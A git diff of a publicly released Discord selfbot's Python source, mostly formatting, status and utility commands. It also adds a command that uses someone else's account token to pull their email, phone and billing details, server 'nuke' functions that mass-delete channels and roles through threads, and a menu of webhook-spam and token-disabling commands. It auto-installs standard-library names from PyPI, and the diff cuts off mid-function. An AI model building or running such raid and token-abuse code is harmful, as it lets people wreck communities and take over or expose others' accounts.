@@ -1,32 +1,133 @@
-from __future__ import unicode_literals
-import os , sys , time,requests,json,ctypes
-from halo import Halo
-import discord
-from random import *
-import asyncio
-import random
-import shutil
+import os
+try:
+    import sys
+except:
+    os.system("pip install sys")
+    import sys
+
 import time
-import threading
-import aiohttp
+try:
+    import requests
+except:
+    os.system("pip install requests")
+    import requests
+
+try:
+    import json
+except:
+    os.system("pip install json")
+    import json
+
+try:
+    import ctypes
+except:
+    os.system("pip install ctypes")
+    import ctypes
+
+
+
+
+
+try:
+    from halo import Halo
+except:
+    os.system("pip install halo")
+    from halo import Halo
+
+
+try:
+    import discord
+except:
+    os.system("pip install discord")
+    import discord
+
+try:
+    import random #should be preinstalled
+except:
+    os.system("pip install random")
+    import random
+
+
+try:
+    import asyncio
+except:
+    os.system("pip install asyncio")
+    import asyncio
+
+
+try:
+    import shutil
+except:
+    os.system("pip install shutil")
+    import shutil
+
+
+    
+try:
+    import threading
+except:
+    os.system("pip install threading")
+    import threading
+
+try:
+    from datetime import datetime
+except:
+    os.system("pip install datetime")
+    from datetime import datetime
+
+try:
+    import base64
+except:
+    os.system("pip install base64")
+    import base64
+
 import re
-import base64
-import ctypes
-from colorama import init, Fore, Back, Style
+
+try:
+    from win10toast import ToastNotifier
+except:
+    os.system("pip install win10toast")
+    from win10toast import ToastNotifier
+
+try:
+    from colorama import init, Fore, Back, Style
+except:
+    os.system("pip install colorama")
+    from colorama import init, Fore, Back, Style
+
 init(convert=True)
 
-from discord.ext import commands
+try:
+    import string
+except:
+    os.system("pip install string")
+    import string
+
+try:
+    from PIL import Image
+except:
+    os.system("pip install pillow")
+    from PIL import Image
+
+
+
+
+characters = string.ascii_letters + string.digits
+
 os.system("cls")
 os.system("mode 100,30")
 os.system("title Scalic Selfbot - Please remember to star it - it took hours and I've released the source!")
-#Notice - this bot is a selfbot to have some fun with. It's intentions aren't purely on thinks like nuking. So yes, those commands will be slow. I know and have made them fast for seperate projects.
+#Notice - this bot is a selfbot to have some fun with.Selfbots are against discords tos and are not to be used - it's a proof of concept
 # I'm fine with people learning from code. I originally learnt by finding scripts on github and changing things round to learn which part was doing which, but I am not a fan on people taking credit for other peoples work.
 #If you feel like you have to change things like channel creation to say your name or whatever that's fine, but I'd really appreciate it if you don't change the footers on messages, this way other people can find out about my bot and use it
 #Please don't sell my work either. It took ages and to give the source code out for free is kind, making money off my free work is just wrong
 #This took lots of hours to work on. Signing up to github takes about 3 minutes max, starring my post  - https://github.com/scalic/scalic-selfbot - takes 5 seconds. If you wouldn't mind pressing the star I'd really appreciate it!
 #Have fun :)
 
-#Also to do - if lots of people get "member not found errors", get the member for each line of code (just time consuming adding it)
+
+
+
+#Also to do - if lots of people get "member not found errors", fetch the member for each cmd thats interactive with others (just time consuming adding it)
 try:
     with open("settings.txt") as setup:
         setup = setup.readlines()
@@ -58,6 +159,7 @@ if sooo.status_code == 200:
 else:
     spinner.stop()
     os.system("cls")
+
     print(' | Invalid token. Put a valid token in settings.txt') 
     try:
         j = json.loads(sooo.text)
@@ -85,6 +187,11 @@ streamurl = setup[13].replace('"',"").replace("STREAMURL=","")
 delaybetweennicknamecycle = setup[14].replace('"',"").replace("NICKNAMECYCLEDELAY=","")
 nicknamedata = setup[15].replace('"',"").replace("NICKNAMECYCLE=","")
 talkingcuteyems = setup[16].replace('"',"").replace("TALKCUTE=","")
+isafk = setup[17].replace('"',"").replace("AFK=","")
+messagetosendwhenafk = setup[18].replace('"',"").replace("ASKMSG=","")
+notifsyems = setup[19].replace('"',"").replace("NOTIFICATIONS-ON-PING=","")
+
+#might switch this to an env file but I've done stuff like that before and like 9% of people knew how to load it - this is more foolproof
 
 statusofediting = editing.strip().lower()
 deletedmessagelogger = deletedmessagelogging.strip().lower()
@@ -107,9 +214,13 @@ deleteafter = deleteafter.strip().lower()
 deleteaftertime = deleteaftertime.strip().lower()
 
 talkingcuteyems = talkingcuteyems.strip().lower()
+isafk = isafk.strip().lower()
+messagetosendwhenafk = messagetosendwhenafk.strip()
+
+notifsyems = notifsyems.strip().lower()
 
 scalic = commands.Bot(prefix.strip(), self_bot=True)
-#scalic.remove_command("help") #this lets me add my own custom help cmd, rather then the ugly default one
+scalic.remove_command("help") #this lets me add my own custom help cmd, rather then the ugly default one
 
 editedmessages ={}
 
@@ -134,7 +245,6 @@ spinner.start()
 #Deleted message sniper - just a reminder of the cmd for me for once I find out why edit sniping is broken
 
 
-#avatar download (just havent got round to it - shouldnt have any problems xd)
 
 #tiktok cmd to type !tiktok [url] - it then sends video source - adds a reaction and when the user REMOVES that reaction (aka clicks it) itll download it - lemme know if u can help with this
 
@@ -153,6 +263,7 @@ def screen():
     os.system("cls")
 
     while True:
+        os.system("mode 100,30")
         currenttime = time.time()
         timedata = currenttime-starttime
         hours = timedata//3600
@@ -198,6 +309,493 @@ def screen():
         time.sleep(1)
         os.system("cls")
 
+@scalic.command(aliases=['color', 'colour',"colourinfo","hex"])
+async def colorinfo(ctx,hexcolor=None):
+    additionalinfo = ""
+    if hexcolor == None:
+        hexcolor = random.randint(0x000000, 0xFFFFFF)
+        additionalinfo = additionalinfo + "- I picked a random color for you since you didn't specify one"
+    data = requests.get(f"https://www.thecolorapi.com/id?hex={hexcolor}").text
+    j = json.loads(data)
+    rgbdata = j['rgb']
+
+    a = str(rgbdata).split("},")[1]
+    
+    embed=discord.Embed(title=f"Details on hex color #{hexcolor} {additionalinfo}", description=a.split(", 'value': 'rgb")[0], color=int(hexcolor))
+    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+    await ctx.message.edit(content="",embed=embed)
+
+
+@scalic.command(aliases=["poll"])
+async def suggest(ctx,*,message="Supply something to suggest lol!"):
+    await ctx.message.delete()
+    randcolor = random.randint(0x000000, 0xFFFFFF) 
+    try:
+        embed=discord.Embed(title=f"Scalic selfbot - poll", description=f"Poll message : `{message}`", color=randcolor)
+        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+        a = await ctx.send(embed=embed)
+    except:
+        a = await ctx.send(message)
+
+
+    await a.add_reaction("👍")
+    await a.add_reaction("👎")
+
+
+@scalic.command(aliases=["shrugging"])
+async def shrug(ctx,*,message=""):
+    await ctx.message.edit(content=f"{message} ¯\_(ツ)_/¯")
+
+@scalic.command(aliases=["tableflip","flip"])
+async def fliptable(ctx,*,message=""):
+    await ctx.message.edit(content=f"{message} (╯°□°）╯︵ ┻━┻")
+
+@scalic.command(aliases=["untableflip","tableunflip","unfliptable"])
+async def unflip(ctx,*,message=""):
+    await ctx.message.edit(content=f"{message} (╯°□°）╯︵ ┳━┳")
+
+@scalic.command(aliases=["tw"])
+async def spoiler(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
+    await ctx.message.edit(content=f"||{message}||")
+
+@scalic.command(aliases=["ul","line"])
+async def underline(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
+    await ctx.message.edit(content=f"__{message}__")
+
+@scalic.command()
+async def bold(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
+    await ctx.message.edit(content=f"**{message}**")
+
+@scalic.command()
+async def italic(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
+    await ctx.message.edit(content=f"_{message}_")
+
+@scalic.command()
+async def block(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
+    await ctx.message.edit(content=f"```\n{message}```")
+
+#Shoutout to https://www.writebots.com/discord-text-formatting/
+
+@scalic.command(aliases=["redblock"])
+async def redtext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
+    await ctx.message.edit(content=f"```diff\n- {message}```")
+
+@scalic.command(aliases=["orangeblock"])
+async def orangetext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
+    await ctx.message.edit(content=f"```css\n[{message}]```")
+
+@scalic.command(aliases=["yellowblock"])
+async def yellowtext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
+    await ctx.message.edit(content=f"```fix\n{message}```")
+
+@scalic.command(aliases=["greenblock"])
+async def greentext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
+    await ctx.message.edit(content=f"```diff\n+{message}```")
+
+@scalic.command(aliases=["lightgreenblock"])
+async def lightgreentext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
+    await ctx.message.edit(content=f"```css\n\"{message}\"```")
+
+@scalic.command(aliases=["cyanblock"])
+async def cyantext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
+    await ctx.message.edit(content=f"```json\n\"{message}\"```")  
+
+@scalic.command(aliases=["blueblock"])
+async def bluetext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
+    await ctx.message.edit(content=f"```ini\n[{message}]```")
+
+
+
+
+###
+@scalic.command(aliases=["encode","base64","base64encode","encodebase64"])
+async def encrypt(ctx,*,message="woah top quality encryption no one will ever see this im telling u"):
+    msg = base64.b64encode(str(message).encode())
+    final = str(msg).replace("'","")
+    await ctx.message.edit(content=f"`{final[1:]}`")
+
+@scalic.command(aliases=["decode","base64decode","decodebase64"])
+async def decrypt(ctx,*,message="d29haCB0b3AgcXVhbGl0eSBlbmNyeXB0aW9uIG5vIG9uZSB3aWxsIGV2ZXIgc2VlIHRoaXMgaW0gdGVsbGluZyB1"):
+    msg = base64.b64decode(str(message).encode())
+    final = str(msg).replace("'","")
+    await ctx.message.edit(content=f"`{final[1:]}`")
+
+
+    
+
+@scalic.command(aliases=["iplocate","locateip","ipgeolocate"])
+async def ip(ctx, *, iparg="1.1.1.1"):
+
+    await ctx.message.delete()
+
+
+    personalip = requests.get("https://api64.ipify.org/?format=text").text #going to double check to attempt not to send our own ip
+
+
+    data = str(os.popen(f"curl -s http://ip-api.com/json/{iparg}").read())
+    data = json.loads(data)
+    content = []
+    for da in data:
+        content.append(f"{str(da)} : {str(data[da])}")
+    desc = ""
+    for e in content:
+        desc = desc + f"{e}\n"
+
+    randcolor = random.randint(0x000000, 0xFFFFFF) 
+    if personalip in desc:
+        
+        embed=discord.Embed(title=f"Scalic selfbot - ip locator", description="Your ip was detected in this data - to double check that your ok with showing the data\npress the reaction button below!", color=randcolor)
+        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+        message = await ctx.send(embed=embed)        
+        await message.add_reaction('✅')      
+        reactionstuffyes = True
+        def requirements(reaction, user):
+            return user == ctx.author and str(reaction.emoji) in ('✅') and message==message
+
+        randcolor = random.randint(0x000000, 0xFFFFFF)
+        while reactionstuffyes:
+            try:
+                reaction, user = await scalic.wait_for('reaction_remove', timeout=10, check=requirements)
+                embed=discord.Embed(title=f"Scalic selfbot - ip locator", description=desc, color=randcolor)
+                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                reactionstuffyes= False   
+
+                await message.edit(embed=embed)
+
+
+            except asyncio.TimeoutError:
+                embed=discord.Embed(title=f"Scalic selfbot - Ip locator", description="You took too long to react - try running this command again or sum", color=randcolor)
+                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                await message.edit(embed=embed)
+                
+                await message.clear_reactions()
+                reactionstuffyes= False   
+
+    else:
+            embed=discord.Embed(title=f"Scalic selfbot - Ip locator", description=desc, color=randcolor)
+            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+            await ctx.send(embed=embed)
+
+
+@scalic.command(aliases=["infotoken"])
+async def tokeninfo(ctx, bokenxd):
+    await ctx.message.delete()
+    data = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': bokenxd,'Content-Type': 'application/json'})
+
+    if data.status_code == 200: 
+
+    # user info
+        j = data.json()
+        # I had something in my folder that helped me with this, if you know who owns the code of subscription data lemme know so I can add credit stuff
+        name = f'{j["username"]}#{j["discriminator"]}'
+        userid = j['id']
+        avatar = f"https://cdn.discordapp.com/avatars/{j['id']}/{j['avatar']}.webp"
+        phone = j['phone']
+        isverified = j['verified']
+        email = j['email']
+        twofa = j['mfa_enabled']
+        flags = j['flags']
+        creation_date = datetime.utcfromtimestamp(((int(userid) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
+        randcolor = random.randint(0x000000, 0xFFFFFF)
+        embed=discord.Embed(title=f"Scalic selfbot - Token info", description=f"Token info:\nUser : `{name}`\nUser-id : `{userid}`\nAvatar url : `{avatar}`\nPhone number linked : `{phone}`\nEmail verification status : `{isverified}`\nEmail linked : `{email}`\n2f/a Status : `{twofa}`\nFlags : `{flags}`", color=randcolor)
+        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+        message = await ctx.send(embed=embed)
+
+        has_nitro = False
+        datahmm = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers={'Authorization': bokenxd,'Content-Type': 'application/json'})
+        nitro_data = datahmm.json()
+        nitroyems = bool(len(nitro_data) > 0)
+        if nitroyems:
+            end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+            start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+            totalnitro = abs((start - end).days)
+            embed=discord.Embed(title=f"Scalic selfbot - Token info", description=f"Token info:\nUser : `{name}`\nUser-id : `{userid}`\nAvatar url : `{avatar}`\nPhone number linked : `{phone}`\nEmail verification status : `{isverified}`\nEmail linked : `{email}`\n2f/a Status : `{twofa}`\nFlags : `{flags}`\n\nNitro Data:\nHad nitro since : `{end}`\nNitro ends on : `{start}`\nTotal nitro : `{totalnitro}`", color=randcolor)
+            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+            await message.edit(embed=embed)
+    else:
+        embed=discord.Embed(title=f"Scalic selfbot - Token info", description=f"Site responded with status code : `{data.status_code}`\nMessage : `{data.text}`", color=randcolor)
+        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+        await ctx.send(embed=embed)
+
+
+@scalic.command(aliases=['pong', 'latency'])
+async def ping(ctx,afkstatus=None):
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+    embed=discord.Embed(title=f"Scalic selfbot - ping pong ping pong ping pong ping pong ping pong ping pong ping pong ping pong ping pong ping pong", description=f'🏓 pong | {round(scalic.latency * 1000)}ms', color=randcolor)
+    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+    await ctx.send(embed=embed)
+
+
+@scalic.command(aliases=['commands', 'commandlist',"commandslist","allcommands","h"])
+async def help(ctx,helpcategory="none"):
+    await ctx.message.delete()
+    helpcategory = helpcategory.lower().replace("[","").replace("]","") 
+    if helpcategory == "none":
+        description =f"""
+There are **lots** of commands.
+
+To avoid clutter - each command is split into categories.
+
+Categories : `System` , `Utility` , `Emoji` , `Moderation` , `Snipe` , `Nuke` , `Fun` , `Text`.
+
+Type `{prefix.strip()}help [category]` for information on its commands
+
+
+"""
+
+    elif "system" in helpcategory:
+        description =f"""
+**🖥️ System Commands**
+
+`{prefix.strip()}help [category]`
+`{prefix.strip()}download`
+`{prefix.strip()}ping`
+`{prefix.strip()}notifications [on/off]`
+`{prefix.strip()}logout`
+
+"""
+    if "utility" in helpcategory:
+        description =f"""
+**⚙️ Utility Commands**
+
+`{prefix.strip()}afk [on/off]`
+`{prefix.strip()}afkmsg [message]`
+`{prefix.strip()}edit [on/off]`
+`{prefix.strip()}talkcute [on/off]`
+`{prefix.strip()}logdeletedmessages [on/off]`
+`{prefix.strip()}logediteddmessages [on/off]`
+`{prefix.strip()}deletemessagesafter [on/off]`
+`{prefix.strip()}timetodeleteafter [seconds]`
+`{prefix.strip()}cycledelay [seconds]`
+`{prefix.strip()}watch [status]`
+`{prefix.strip()}watchcycle`
+`{prefix.strip()}listen [status]`
+`{prefix.strip()}listencycle`
+`{prefix.strip()}game [status]`
+`{prefix.strip()}gamecycle`
+`{prefix.strip()}stream [status]`
+`{prefix.strip()}streamcycle`
+`{prefix.strip()}twitchurl [twitch-url for stream status]`
+`{prefix.strip()}biocycle`
+`{prefix.strip()}nicknamecycle`
+`{prefix.strip()}nicknamecycledelay [seconds]`
+`{prefix.strip()}userinfo [user]`
+`{prefix.strip()}serverinfo`
+`{prefix.strip()}autolevel`
+`{prefix.strip()}autobump`
+`{prefix.strip()}uptime`
+`{prefix.strip()}avatar`
+`{prefix.strip()}downloadavatar`
+`{prefix.strip()}purge [amount]`
+`{prefix.strip()}dmclear`
+`{prefix.strip()}backup`
+`{prefix.strip()}urbandictionary [word]`
+`{prefix.strip()}embed [message]`
+`{prefix.strip()}colorinfo [hex-color]`
+`{prefix.strip()}bitcoin`
+`{prefix.strip()}suggest [suggestion]`
+`{prefix.strip()}hypesquad [bravery/brilliance/balance]`
+`{prefix.strip()}idtoname [id]`
+`{prefix.strip()}invite`
+`{prefix.strip()}ip [ip-to-locate]`
+`{prefix.strip()}join [invite]`
+`{prefix.strip()}leave [server-id]`
+`{prefix.strip()}tinyurl [url]`
+
+
+
+
+"""
+    elif "emoji" in helpcategory:
+        description =f"""
+**😎  Emoji Commands**
+
+`{prefix.strip()}addemoji [emoji]`
+`{prefix.strip()}bigemoji [emoji]`
+`{prefix.strip()}downloadguildemojis [guild-id]`
+`{prefix.strip()}stealguildemoji [guild-id]`
+
+"""    
+
+    elif "moderation" in helpcategory:
+        description =f"""
+**🔨 Moderation Commands**
+
+`{prefix.strip()}kick [user]`
+`{prefix.strip()}ban [user]`
+`{prefix.strip()}banid [user-id]`
+`{prefix.strip()}unban [user-id]`
+`{prefix.strip()}clearcontent [amount,content]`
+`{prefix.strip()}nuke`
+
+
+"""    
+    elif "snipe" in helpcategory:
+        description =f"""
+**🔫 Snipe Commands**
+
+`{prefix.strip()}snipe`
+`{prefix.strip()}nitrosnipe [on/off]`
+`{prefix.strip()}giveawaysnipe [on/off]`
+`{prefix.strip()}pastebinsnipe [on/off]`
+`{prefix.strip()}privnotesnipe [on/off]`
+
+
+"""   
+
+    elif "nuke" in helpcategory:
+        description =f"""
+**☢️ Nuke Commands**
+
+`{prefix.strip()}channelspam [amount,name]`
+`{prefix.strip()}deletechannels`
+`{prefix.strip()}rolespam [amount,name]`
+`{prefix.strip()}deleteroles`
+`{prefix.strip()}emojinuke`
+`{prefix.strip()}webhookspam`
+`{prefix.strip()}stopwebhookspam`
+`{prefix.strip()}webhookdelete [webhook]`
+`{prefix.strip()}tokeninfo [token]`
+`{prefix.strip()}tokendisable [token]`
+`{prefix.strip()}fucktoken [token]`
+
+
+"""   
+
+
+    elif "fun" in helpcategory:
+        description =f"""
+**🤣 Fun Commands**
+
+`{prefix.strip()}ascii [word]`
+`{prefix.strip()}name [name]`
+`{prefix.strip()}nitro`
+`{prefix.strip()}impersonate [user] [message]`
+`{prefix.strip()}www [user]`
+`{prefix.strip()}stickbug [user]`
+`{prefix.strip()}tweet [user] [message]`
+`{prefix.strip()}blurpify [user]`
+`{prefix.strip()}magic [user]`
+`{prefix.strip()}deepfry [user]`
+`{prefix.strip()}captcha [user]`
+`{prefix.strip()}threat [user]`
+`{prefix.strip()}iphone [user]`
+`{prefix.strip()}ship [user]`
+`{prefix.strip()}kannagen [text]`
+`{prefix.strip()}changemymind [opinion]`
+`{prefix.strip()}clyde [message]`
+`{prefix.strip()}encrypt [message]`
+`{prefix.strip()}decrypt [message]`
+`{prefix.strip()}tokenhalf [user]`
+`{prefix.strip()}vcspam [vc-id-one] [vc-id-two] [user-id] [amount]`
+`{prefix.strip()}spampin [amount]`
+`{prefix.strip()}spamreact [amount] [reaction]`
+`{prefix.strip()}spamedit [amount] [new-message]`
+`{prefix.strip()}spam [amount] [message]`
+`{prefix.strip()}embedspam [amount] [new-message]`
+`{prefix.strip()}qr [message]`
+`{prefix.strip()}mimic [user]`
+`{prefix.strip()}joke`
+
+
+"""   
+
+    elif "text" in helpcategory:
+        description =f"""
+**🤣 Fun Commands**
+
+`{prefix.strip()}block [text]`
+`{prefix.strip()}redtext [text]`
+`{prefix.strip()}orangetext [text]`
+`{prefix.strip()}yellowtext [text]`
+`{prefix.strip()}lightgreentext [text]`
+`{prefix.strip()}greentext [text]`
+`{prefix.strip()}cyantext [text]`
+`{prefix.strip()}bluetext [text]`
+`{prefix.strip()}bold [text]`
+`{prefix.strip()}underline [text]`
+`{prefix.strip()}spoiler [text]`
+`{prefix.strip()}italic [text]`
+`{prefix.strip()}shrug [text]`
+`{prefix.strip()}fliptable [text]`
+`{prefix.strip()}unfliptable [text]`
+`{prefix.strip()}hastebin [text]`
+    
+"""   
+
+    else:
+        description =f"""
+{description} is an invalid category, pick one of the following:
+Categories : `System` , `Utility` , `Emoji` , `Moderation` , `Snipe` , `Nuke` , `Fun` , `Text`.
+
+Type `{prefix.strip()}help [category]` for information on its commands
+
+
+"""
+
+    embed=discord.Embed(title=f"Scalic Selfbot", description=description, color=0x36393f)
+    await ctx.send(embed=embed)
+
+
+
+
+
+
+@scalic.command(aliases=['afkoff', 'afkon'])
+async def afk(ctx,afkstatus=None):
+    global isafk 
+
+    print(ctx.message.content)
+    if ctx.message.content == f"{prefix.strip()}afkoff":
+        isafk = "off"
+
+    elif ctx.message.content == f"{prefix.strip()}afkon":
+        isafk = "on"
+
+    elif afkstatus == None:
+        if isafk == "off":
+            isafk = "on"
+        elif isafk == "on":
+            isafk = "off"
+    else:
+        if afkstatus.lower() == "off":
+            isafk = "off"
+        if afkstatus.lower() == "on":
+            isafk = "on"
+
+        if afkstatus.lower() == "true":
+            isafk = "on"
+        if afkstatus.lower() == "false":
+            isafk = "off"
+
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+    embed=discord.Embed(title="Scalic Selfbot - Afk auto messager", description=f"Afk messages are now : `{isafk}`\nTry {prefix.strip()}afkmessage [message]", color=randcolor)
+    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+    await ctx.message.edit(content="",embed=embed)
+
+@scalic.command(aliases=['afkmessage', 'afkmessageedit'])
+async def afkmsg(ctx,afkstatus="I'm afk , wait for me to reply"):
+    global messagetosendwhenafk 
+
+    messagetosendwhenafk = afkstatus
+
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+    embed=discord.Embed(title="Scalic Selfbot - Afk auto messager", description=f"Afk messages are : `{isafk}`\nAfk message is : `{messagetosendwhenafk}`", color=randcolor)
+    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+    await ctx.message.edit(content="",embed=embed)
+
 @scalic.command(aliases=["timerunning","elapsed"])
 async def uptime(ctx):
     global starttime
@@ -228,7 +826,23 @@ async def gamecycle(ctx):
             await scalic.change_presence(status=discord.Status.online, activity=discord.Game(name=gamestatus))
             await asyncio.sleep(int(delaybetweencycle)) 
 
+@scalic.command(aliases=["cyclestatus","statuscycle","cyclebio"])
+async def biocycle(ctx):
+    global statusdata
+    global delaybetweencycle
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+    embed=discord.Embed(title="Scalic Selfbot - Bio Cycle", description=f"Cycling these statuses:\n`{statusdata}`\nDelay:\n`{delaybetweencycle}`", color=randcolor)
+    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+    await ctx.message.edit(content="",embed=embed)
+    headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
+    while True:
+        for biostatus in statusdata:
+            requests.patch("https://discord.com/api/v8/users/@me/settings",headers=headers,json={"custom_status":{"text":biostatus}})
+            await asyncio.sleep(int(delaybetweencycle)) 
 
+
+    
 
 @scalic.command(aliases=["cyclewatch","cyclewatchstatus","watchstatuscycle","cyclewatchingstatus","cyclewatching","watchingcycle"])
 async def watchcycle(ctx):
@@ -253,7 +867,7 @@ async def nicknamecycle(ctx,statustocycle=None):
     if statustocycle == None or statustocycle.lower() == "yes" or statustocycle.lower() == "on":
         nicknamestuffyes = "on"
         
-        embed=discord.Embed(title="Scalic Selfbot - Nickname Cycle", description=f"Cycling these statuses:\n`{nicknamedata}`\nDelay:\n`{delaybetweennicknamecycle}`\nCycle status : `{nicknamestuffyes}`\n{prefix.strip()}nicknamecycle off **to stop the cycle**", color=randcolor)
+        embed=discord.Embed(title="Scalic Selfbot - Nickname Cycle", description=f"Cycling these statuses:\n`{nicknamedata}`\nDelay:\n`{delaybetweennicknamecycle}`\nCycle status : `{nicknamestuffyes}`\n{prefix.strip()}nicknamecycle off **to stop the cycle** \nAlso try {prefix.strip()}nicknamecycledelay ", color=randcolor)
         embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
         embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
         await ctx.message.edit(content="",embed=embed)
@@ -273,6 +887,7 @@ async def nicknamecycle(ctx,statustocycle=None):
 @scalic.command(aliases=["nickdelay","nicknamedelay","delaynicks","delaynick","delaynicknames","addnicknamedelay","changenicknamedelay"])
 async def nicknamecycledelay(ctx,newdelay="5"):
     global delaybetweennicknamecycle
+    randcolor = random.randint(0x000000, 0xFFFFFF)
     delaybetweennicknamecycle = int(newdelay)
     embed=discord.Embed(title="Scalic Selfbot - Nickname Delay", description=f"Delay is now : `{delaybetweennicknamecycle} seconds`\n{prefix.strip()}nicknamecycle", color=randcolor)
     embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
@@ -373,6 +988,18 @@ async def twitchurl(ctx, streamurltouse):
     await ctx.message.edit(content="",embed=embed)
        
 
+@scalic.command(aliases=["btc","btcusd","usdbtc"])
+async def bitcoin(ctx):
+    data = requests.get("https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD").text
+    j = json.loads(data)
+    dolor = j['USD']
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+    embed=discord.Embed(title="Scalic Selfbot - Bitcoin command", description=f"Bitcoin value : `${dolor}`", color=randcolor)
+    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+    await ctx.message.edit(content="",embed=embed)
+
+
 @scalic.command(aliases=["invitelink","makeinvite","createinvite"])
 async def invite(ctx): 
     payload = {
@@ -443,7 +1070,301 @@ async def on_connect():
     spinner.stop()
     os.system("cls")
     threading.Thread(target = screen).start()
+    try:
 
+        f = open(f"./data/{str(scalic.user.id)}.ico",'r')
+        f.close()
+    except:
+        response = requests.get(scalic.user.avatar_url, stream=True)
+        with open(f"./data/{str(scalic.user.id)}.png", 'wb') as scalic_pfp: 
+            shutil.copyfileobj(response.raw, scalic_pfp)
+
+        filename = f"./data/{str(scalic.user.id)}.png"
+        img = Image.open(filename)
+        img.save(f"./data/{str(scalic.user.id)}.ico",format = 'ICO', sizes=[(32,32)])
+
+
+
+
+
+
+def deletionofachannel(channeldetails):
+    try:
+        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
+        requests.delete(f"https://canary.discord.com/api/v8/channels/{channeldetails}",headers=headers)
+    except:
+        pass
+
+def deletionofarole(idoftheguild,roledetails):
+    try:
+        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
+        requests.delete(f"https://discord.com/api/v8/guilds/{idoftheguild}/roles/{roledetails}",headers=headers)
+    except:
+        pass
+
+@scalic.command(aliases=['deletechans', 'deleteallchannels',"delchan","delchans","channeldel","channeldeletion"])
+async def deletechannels(ctx):
+    await ctx.message.delete()
+    for chan in ctx.guild.channels:
+     
+        try:
+            threading.Thread(target = deletionofachannel, args = (chan.id,)).start() 
+        except:
+            pass
+
+@scalic.command(aliases=['deleterols', 'deleteallroles',"delroles","roledel","delrols","roldel","roledeletion"])
+async def deleteroles(ctx):
+    await ctx.message.delete()
+    for rol in ctx.guild.roles:
+        threading.Thread(target = deletionofarole, args = (ctx.guild.id,rol.id,)).start()
+
+def ssspam(webhook):
+    global spammingdawebhookeroos
+    while spammingdawebhookeroos:
+
+        randcolor = random.randint(0x000000, 0xFFFFFF)
+        data = {
